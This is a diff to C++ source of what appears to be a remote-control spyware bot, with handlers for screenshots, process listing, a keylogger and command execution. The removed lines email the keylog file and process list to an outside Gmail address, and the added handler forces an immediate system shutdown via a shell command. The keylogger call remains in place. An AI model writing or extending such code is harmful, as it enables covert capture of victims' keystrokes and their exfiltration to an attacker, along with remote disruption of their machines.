@@ -47,17 +47,13 @@ void handle_get_screenshot() {
 
 void handle_list_programs() {
     list_programs();
-    Sleep(1000);
-    ifstream test_file("process_list.txt");
-    if (test_file.good()) {
-      test_file.close();
-      send_email_with_attachment(
-          "serverbottestmmt@gmail.com", "Running Process List",
-          "Attached is the current process list.", "process_list.txt");
-    } else {
-      cerr << "Failed to create process list file" << endl;
+}
+
+void handle_shutdown() {
+    cout << "Initiating system shutdown..." << endl;
+    if (system("shutdown /s /t 0") != 0) {
+        cerr << "Shutdown command failed" << endl;
     }
-  }
 }
 
 void handle_keylogger(const string& command) {
@@ -68,16 +64,6 @@ void handle_keylogger(const string& command) {
 
     cout << "Starting keylogger for " << duration << " seconds..." << endl;
     start_keylogger("keylog.txt", duration);
-
-    ifstream test_file("keylog.txt");
-    if (test_file.good()) {
-        test_file.close();
-        send_email_with_attachment(
-            "serverbottestmmt@gmail.com", "Keylogger Log",
-            "Keylog data from the remote device.", "keylog.txt");
-    } else {
-        cerr << "Failed to create keylog file" << endl;
-    }
 }
 
 void execute_command(const string& command) {
